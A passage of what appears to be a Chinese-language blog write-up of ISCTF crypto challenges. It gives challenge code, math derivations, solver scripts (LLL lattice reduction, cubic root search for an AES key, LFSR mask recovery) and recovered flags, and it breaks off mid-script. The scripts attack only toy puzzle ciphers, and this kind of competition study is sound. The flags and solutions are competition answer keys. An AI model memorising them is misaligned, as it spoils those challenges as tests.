<p>密文:<br>00<br>Flag:<br>00 00 00 -1 -1 00 -1 00 -1 00 00 00 -1 -1 00 -1 -1 00 00 00 -1 -1 00 -1 00 -1 -1 00 00 00 00 00 00 -1 00 -1 -1 -1 -1 00 -1 -1 00</p>
<p>于是莫名其妙的试了一下a=1, b=1, c=2147483648：</p>
<p>密文:<br>42<br>Flag:</p>
<p>4a 54 44 55 47 7c 39 36 39 66 38 38 35 37 2e 31 31 32 3a 2e 35 31 62 65 2e 63 37 38 64 2e 32 36 3a 63 62 67 39 35 63 36 63 39 7e</p>
<p>事实上42是66的十进制表示，所以每个字节凯撒移位1即可得到<strong>ISCTF{858e7746-0019-40ad-b67c-159baf84b5b8}</strong></p>
<ul>
<li><p>baby_math</p>
<blockquote>
<p>死去的记忆突然被唤醒了</p>
</blockquote>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag)) </span><br><span class="line">R = RealField(<span class="number">1000</span>)</span><br><span class="line">a,b = bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]),bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:])</span><br><span class="line">x   = R(<span class="number">0.75872961153339387563860550178464795474547887323678173252494265684893323654606628651427151866818730100357590296863274236719073684620030717141521941211167282170567424114270941542016135979438271439047194028943997508126389603529160316379547558098144713802870753946485296790294770557302303874143106908193100</span>)</span><br><span class="line"> </span><br><span class="line">enc = a*cos(x)+b*sin(x) </span><br><span class="line"></span><br><span class="line"><span class="comment">#1.24839978408728580181183027675785982784764821592156892598136000363397267152291738689909414790691435938223032351375697399608345468567445269769342300325192248438038963977207296241971217955178443170598629648414706345216797043374408541203167719396818925953801387623884200901703606288664141375049626635852e52</span></span><br></pre></td></tr></table></figure>
<p>这个题是真没想到和LLL有关，AI梭的</p>
<script type="math/tex; mode=display">
\begin{gather}
a⋅cos(x)+b⋅sin(x)≈enc \\
we\ need\ to\ find\ a,b\ let\ a·cos(x)+b·sin(x)-enc≈0 \\
\end{gather}</script><script type="math/tex; mode=display">
M = 
\begin{pmatrix}
1 & 0 & \lfloor K\cdot\cos(x) \rceil \\
0 & 1 & \lfloor K\cdot\sin(x) \rceil \\
0 & 0 & \lfloor K\cdot\text{enc} \rceil
\end{pmatrix}</script><script type="math/tex; mode=display">
v=(a,b,⌊K(acosx+bsinx)⌋−⌊K⋅enc⌉)≈(a,b,0)</script><p><img src="/images/QianJianTec1766496987394.png" alt=""></p>
<p><img src="/images/QianJianTec1766497021370.png" alt=""></p>
<p><img src="/images/QianJianTec1766497062263.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">x_str = <span class="string">"0.75872961153339387563860550178464795474547887323678173252494265684893323654606628651427151866818730100357590296863274236719073684620030717141521941211167282170567424114270941542016135979438271439047194028943997508126389603529160316379547558098144713802870753946485296790294770557302303874143106908193100"</span></span><br><span class="line">enc_str = <span class="string">"1.24839978408728580181183027675785982784764821592156892598136000363397267152291738689909414790691435938223032351375697399608345468567445269769342300325192248438038963977207296241971217955178443170598629648414706345216797043374408541203167719396818925953801387623884200901703606288664141375049626635852e52"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 设置高精度环境</span></span><br><span class="line"><span class="comment"># 题目中使用了 RealField(1000)，我们需要匹配这个精度</span></span><br><span class="line">R = RealField(<span class="number">1000</span>)</span><br><span class="line">x = R(x_str)</span><br><span class="line">enc = R(enc_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 构造格 (Lattice)</span></span><br><span class="line"><span class="comment"># 目标方程: a * cos(x) + b * sin(x) - enc ≈ 0</span></span><br><span class="line"><span class="comment"># 放大因子 K。由于输入精度约为 1000 bits (300 digits)，我们设置 K 接近这个精度。</span></span><br><span class="line">K = <span class="number">10</span>**<span class="number">300</span> </span><br><span class="line"></span><br><span class="line">M = Matrix(ZZ, [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="built_in">round</span>(K * cos(x))],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="built_in">round</span>(K * sin(x))],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="built_in">round</span>(K * enc)]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. LLL 格归约</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Running LLL..."</span>)</span><br><span class="line">M_reduced = M.LLL()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 提取结果</span></span><br><span class="line"><span class="comment"># LLL 归约后的矩阵第一行通常就是最短向量</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Checking rows for flag..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> M_reduced:</span><br><span class="line"></span><br><span class="line">    a_cand = <span class="built_in">abs</span>(row[<span class="number">0</span>])</span><br><span class="line">    b_cand = <span class="built_in">abs</span>(row[<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 简单的过滤：a 和 b 不应为 0</span></span><br><span class="line">    <span class="keyword">if</span> a_cand == <span class="number">0</span> <span class="keyword">or</span> b_cand == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 尝试转换为字节</span></span><br><span class="line">        part1 = long_to_bytes(Integer(a_cand))</span><br><span class="line">        part2 = long_to_bytes(Integer(b_cand))</span><br><span class="line">        </span><br><span class="line">        flag_cand = part1 + part2</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">b'ISCTF{'</span> <span class="keyword">in</span> flag_cand:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Found Candidate: <span class="subst">{flag_cand}</span>"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p><strong>ISCTF{164a3221-7306-4024-88c3-4ef557b86895}</strong></p>
<ul>
<li><p>小蓝鲨的RSA密文</p>
<blockquote>
<p>“小蓝鲨是海洋数学天才，它最近正在深耕RSA领域。你嗤之以鼻，心想RSA不是最基础的密码学知识吗？于是你信誓旦旦的跑到小蓝鲨面前告诉它你已经完全掌握了RSA，并宣称所有的RSA题目你都能做出来。 小蓝鲨意味深长的看了你一眼，并出了一道RSA来考考你。现在，该你向它证明你的实力了。”</p>
</blockquote>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json, secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">N = getPrime(<span class="number">512</span>) * getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">a2_high = a2 &gt;&gt; LOW_BITS</span><br><span class="line"></span><br><span class="line">aes_key = secrets.token_bytes(<span class="number">16</span>)</span><br><span class="line">m = bytes_to_long(aes_key)</span><br><span class="line"></span><br><span class="line">f = a2 * (m * m) + a1 * m + a0</span><br><span class="line"></span><br><span class="line">c = (<span class="built_in">pow</span>(m, e) + f) % N</span><br><span class="line"></span><br><span class="line">iv = secrets.token_bytes(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(aes_key, AES.MODE_CBC, iv=iv)</span><br><span class="line">ct = cipher.encrypt(pad(FLAG, <span class="number">16</span>))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">N = 121288600621198389662246479277632294800423697823363188896668775456771641807233781416525282234787873435904747571468452950479817935684848143651716343606633656969395065588423982440884464542428742861388200306417822228591316703916504170245990423925894477848679490979364923848426643149659758241239900845544537886777</span></span><br><span class="line"><span class="string">c = 3756824985347508967549776773725045773059311839370527149219720084008312247164501688241698562854942756369420003479117</span></span><br><span class="line"><span class="string">a2_high = 9012778</span></span><br><span class="line"><span class="string">LOW_BITS = 16</span></span><br><span class="line"><span class="string">a1 = 621315</span></span><br><span class="line"><span class="string">a0 = 452775142</span></span><br><span class="line"><span class="string">iv = bf38e64bb5c1b069a07b7d1d046a9010</span></span><br><span class="line"><span class="string">ct = 8966006c4724faf53883b56a1a8a08ee17b1535e1657c16b3b129ee2d2e389744c943014eb774cd24a5d0f7ad140276fdec72eb985b6de67b8e4674b0bcdc4a5</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<p>翻译一下</p>
<script type="math/tex; mode=display">
\begin{gather}
assume\ FLAG=P \\
f=a2*m^2+a1*m+a0 \\
c=(m^e+f)\ mod\ n \\
so\ c=(m^3+a2*m^2+a1*m+a0)\ mod\ n \\
P'=pad(P)=P_1'||P_2'||...||P_n' \\
C_0=iv \\
C_i=AES_K(P_i'\ xor\ C_{i-1}) \\
ct=C_1||C_2||...||C_n \\
\\
a2high=a2>>16 \\
\end{gather}</script><p><img src="/iamges/QianJianTec1766497105602.png" alt=""></p>
<p>先爆破a2再恢复m</p>
<script type="math/tex; mode=display">
\begin{gather}
x∈[0,1,...,2^{16}-1] \\
a2=a2high<<16+x \\
c=m^3+a2*m^2+a1*m+a0 \\
define\ h(m)=m^3+a2*m^2+a1*m+a0-c \\
we\ need\ to\ find\ m\ let\ h(m)=0 \\
\end{gather}</script><p><img src="/images/QianJianTec1766497162908.png" alt=""></p>
<p>可以使用二分法找到m。注意！m不是明文哦，m=long_to_bytes(aes_key)</p>
<script type="math/tex; mode=display">
\begin{gather}
aes-key=bytes(m) \\
ct=C_1||C_2||...||C_n \\
P_1'=AES_K^{-1}(C_1)\ xor\ iv \\
P_i'=AES_K^{-1}(C_i)\ xor\ C_{i-1} \\
P'=P_1'||P_2'||...||P_n' \\
FLAG=P=unpad(P')\\
\end{gather}</script><p><img src="/images/QianJianTec1766497232727.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">c = <span class="number">3756824985347508967549776773725045773059311839370527149219720084008312247164501688241698562854942756369420003479117</span></span><br><span class="line">a2_high = <span class="number">9012778</span></span><br><span class="line">LOW_BITS = <span class="number">16</span></span><br><span class="line">a1 = <span class="number">621315</span></span><br><span class="line">a0 = <span class="number">452775142</span></span><br><span class="line">iv_hex = <span class="string">"bf38e64bb5c1b069a07b7d1d046a9010"</span></span><br><span class="line">ct_hex = <span class="string">"8966006c4724faf53883b56a1a8a08ee17b1535e1657c16b3b129ee2d2e389744c943014eb774cd24a5d0f7ad140276fdec72eb985b6de67b8e4674b0bcdc4a5"</span></span><br><span class="line"></span><br><span class="line">iv = binascii.unhexlify(iv_hex)</span><br><span class="line">ct = binascii.unhexlify(ct_hex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_m</span>():</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">1</span> &lt;&lt; <span class="number">128</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &lt;&lt; LOW_BITS):</span><br><span class="line">        <span class="comment"># Reconstruct potential a2</span></span><br><span class="line">        a2 = (a2_high &lt;&lt; LOW_BITS) + x</span><br><span class="line"></span><br><span class="line">        target = c</span><br><span class="line"></span><br><span class="line">        l, r = low, high</span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        m_candidate = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = (l + r) // <span class="number">2</span></span><br><span class="line">            val = mid**<span class="number">3</span> + a2 * mid**<span class="number">2</span> + a1 * mid + a0</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> val == target:</span><br><span class="line">                <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">elif</span> val &lt; target:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = mid - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Searching for m..."</span>)</span><br><span class="line">m = solve_m()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> m:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"Found m: <span class="subst">{m}</span>"</span>)</span><br><span class="line">    key = long_to_bytes(m)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Decrypt</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cipher = AES.new(key, AES.MODE_CBC, iv=iv)</span><br><span class="line">        flag = unpad(cipher.decrypt(ct), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Flag:"</span>, flag.decode())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Decryption failed:"</span>, e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Failed to find m."</span>)</span><br></pre></td></tr></table></figure>
<p><strong>ISCTF{i7_533M5_Lik3_You_R34lLy_UNd3R574nd_Polinomials_4nD_RSA}</strong></p>
<ul>
<li><p>小蓝鲨的LFSR系统</p>
<blockquote>
<p>“小蓝鲨是海洋情报局的新晋密码专家，它设计了一个基于LFSR的流密码系统来加密机密信息。这个系统看起来简单高效，但小蓝鲨不知道的是，LFSR在某些情况下可能存在安全隐患。 一天，小蓝鲨的加密系统被神秘的黑客组织””深海幽灵””入侵，他们截获了一段加密信息。作为海洋安全部门的成员，你需要分析这个加密系统，找出潜在的弱点，并解密被截获的信息。”</p>
</blockquote>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_lfsr_encrypt</span>(<span class="params">plaintext, init_state</span>):</span><br><span class="line">    mask = [random.randint(<span class="number">0</span>,<span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line">    </span><br><span class="line">    state = init_state.copy()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        feedback = <span class="built_in">sum</span>(state[i] &amp; mask[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)) % <span class="number">2</span></span><br><span class="line">        state.append(feedback)</span><br><span class="line">    </span><br><span class="line">    key = <span class="built_in">bytes</span>(<span class="built_in">int</span>(<span class="string">''</span>.join(<span class="built_in">str</span>(bit) <span class="keyword">for</span> bit <span class="keyword">in</span> mask[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>]), <span class="number">2</span>) </span><br><span class="line">               <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line">    </span><br><span class="line">    keystream = (key * (<span class="built_in">len</span>(plaintext)//<span class="number">16</span> + <span class="number">1</span>))[:<span class="built_in">len</span>(plaintext)]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(p ^ k <span class="keyword">for</span> p, k <span class="keyword">in</span> <span class="built_in">zip</span>(plaintext, keystream)), mask</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">initState = [0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0]</span></span><br><span class="line"><span class="string">outputState = [0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1]</span></span><br><span class="line"><span class="string">ciphertext = '4b3be165a0a0edd67ca8f143884826725107fd42d6a6'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<p>有点像测信道攻击</p>
<script type="math/tex; mode=display">
\begin{gather}
initState=(s_1,s_2,...,s_{128}) \\
outputState=(s_{129},s_{130},...,s_{383}) \\
let\ K=(K_0,K_1,...,K_{15}) \\
\\
encrypt\ process: \\
s_{n+128}=xor_{i=0}^{127}{(mask[i]·s_{n+i})}(for\ n\ from\ 0\ to\ 255) \\
K_j=\sum_{k=0}^{15}{(mask[8j+k]*2^{7-k})}(for\ j\ from\ 0\ to\ 15) \\
notice\ keystream=(K_0,K_1,...,K_{15},K_0,K_1,...) \\
ciphertext_i=plaintext_i\ xor\ K_{i\ mod\ 16} \\ 
\\
decrypt\ process: \\
let\ stream=(s_1,s_2,...,s_{384}) \\
so\ stream=initState||outputState \\
define\ matrix\ A: A_{n,i}=s_{n+i}\\
define\ matrix\ M: M=(mask[0],mask[1],...,mask[127])^T \\
define\ matrix\ B: B=(s_{128},s_{129},...,s{383})\\
so\ A·M=B \\
After\ we\ get\ M,we\ know\ mask[i]\ and\ we\ can\ get\ keystream \\
plaintext_i=ciphertext_i\ xor\ K_{i\ mod\ 16} \\
\end{gather}</script><p><img src="/images/QianJianTec1766497270311.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 数据</span></span><br><span class="line">initState = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">outputState = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span 